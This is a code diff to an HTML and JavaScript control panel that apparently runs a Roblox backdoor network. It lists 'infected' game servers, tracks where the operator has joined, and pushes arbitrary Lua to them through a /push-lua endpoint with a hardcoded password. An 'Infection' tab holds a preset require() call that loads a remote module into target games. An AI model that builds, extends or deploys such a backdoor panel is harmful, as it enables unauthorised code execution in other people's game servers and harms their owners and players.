@@ -20,6 +20,9 @@
         .rh-pill { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 12px; font-size: 9px; cursor: pointer; }
         .status-bar { font-size: 10px; margin-bottom: 10px; padding: 8px; border-radius: 8px; background: rgba(255,59,48,0.1); color: #ff3b30; text-align: center; }
         .status-bar.found { background: rgba(52,199,89,0.1); color: #34c759; }
+        .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
+        .game-item { padding: 12px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 12px; transition: 0.2s; }
         .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; gap: 10px; z-index: 2000; }
     </style>
 </head>
@@ -64,7 +67,7 @@
                     <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
                     <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
                 </div>
-                <select id="target_id" disabled><option value="">Scanning...</option></select>
+                <select id="target_id" disabled><option value="">Auto-Scanning...</option></select>
                 <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
                 <button class="btn-main" onclick="send('single')">Execute Target</button>
             </div>
@@ -72,19 +75,19 @@
             <div id="wl" class="tab-content" style="display:none;">
                 <h2>Whitelist</h2>
                 <input type="text" id="wid" placeholder="Enter Full Roblox Username">
-                <button class="btn-main" onclick="saveWl()">Save & Start Scanning</button>
-                <p id="save-msg" style="font-size: 10px; color: #34c759; margin-top: 5px; display: none;">Username saved! Scanning nodes...</p>
+                <button class="btn-main" onclick="saveWl()">Save & Start Tracking</button>
+                <p id="save-msg" style="font-size: 10px; color: #34c759; margin-top: 5px; display: none;">Tracking active!</p>
             </div>
 
+            <div id="nodes" class="tab-content" style="display:none;">
+                <h2>Active Games</h2>
+                <div id="node_list" class="node-box"></div>
+            </div>
+            
             <div id="inf" class="tab-content" style="display:none;">
                 <h2>Infection</h2>
                 <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                 <button class="btn-main" onclick="send('inf')">Deploy</button>
-            </div>
-
-            <div id="nodes" class="tab-content" style="display:none;">
-                <h2>Games</h2>
-                <div id="node_list" class="node-box" style="height: 180px; background:#000; overflow-y:auto;"></div>
             </div>
         </div>
     </div>
@@ -136,8 +139,7 @@
             detectedJobId = null;
             for (let k in currentNodes) {
                 if (currentNodes[k].players && currentNodes[k].players.some(p => p.toLowerCase() === name)) {
-                    detectedJobId = k;
-                    break;
+                    detectedJobId = k; break;
                 }
             }
 
@@ -148,16 +150,8 @@
             } else {
                 status.innerText = "Join the infected game";
                 status.className = "status-bar";
-                select.innerHTML = `<option value="">Waiting for Player...</option>`;
+                select.innerHTML = `<option value="">Searching for you...</option>`;
             }
-        }
-
-        async function send(tabId) {
-            const lua = document.querySelector(`#${tabId} textarea`).value;
-            const tid = tabId === 'single' ? detectedJobId : null;
-            if(tabId === 'single' && !tid) return alert("Error: Join the infected game");
-            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
-            alert("Sent");
         }
 
         async function update() {
@@ -166,8 +160,24 @@
                 currentNodes = await res.json();
                 autoScan();
                 const keys = Object.keys(currentNodes);
-                document.getElementById('node_list').innerHTML = keys.map(k => `<div style="padding:10px; border-bottom:1px solid #333;"><b>${currentNodes[k].name}</b></div>`).join('') || '<div style="padding:20px; text-align:center;">No Nodes</div>';
+                document.getElementById('node_list').innerHTML = keys.map(k => `
+                    <div class="game-item">
+                        <div>
+                            <b style="font-size:12px;">${currentNodes[k].name}</b><br>
+                            <small style="color:#666; font-size:9px;">${k}</small><br>
+                            <small style="color:var(--apple-blue); font-size:9px;">Players: ${currentNodes[k].players ? currentNodes[k].players.length : 0}</small>
+                        </div>
+                        <a class="join-btn" href="roblox://placeId=${currentNodes[k].placeId}&gameInstanceId=${k}">JOIN</a>
+                    </div>`).join('') || '<div style="padding:20px; text-align:center;">No Nodes Online</div>';
             } catch(e) {}
+        }
+
+        async function send(tabId) {
+            const lua = document.querySelector(`#${tabId} textarea`).value;
+            const tid = tabId === 'single' ? detectedJobId : null;
+            if(tabId === 'single' && !tid) return alert("Error: Join the infected game");
+            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
+            alert("Payload Sent");
         }
 
         setInterval(update, 5000);
